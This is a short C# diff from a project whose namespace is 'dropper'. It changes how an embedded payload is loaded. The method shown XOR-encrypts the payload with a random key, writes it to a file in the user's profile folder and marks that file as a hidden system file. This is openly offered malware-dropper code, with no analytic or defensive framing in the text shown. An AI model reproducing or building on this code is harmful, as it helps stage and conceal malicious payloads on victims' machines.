@@ -10,7 +10,7 @@ namespace dropper
         public static string GenerateCommand(string token, string prefix, string geolock, Random rng)
         {
             string xorkey = RandomString(20, rng);
-            byte[] encrypted = XORCrypt(Convert.FromBase64String(Resource1.payload_data), xorkey);
+            byte[] encrypted = XORCrypt(Resource1.payload, xorkey);
             string temppath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\wello.tmp";
             File.WriteAllBytes(temppath, encrypted);
             File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\wello.tmp", FileAttributes.System | FileAttributes.Hidden);
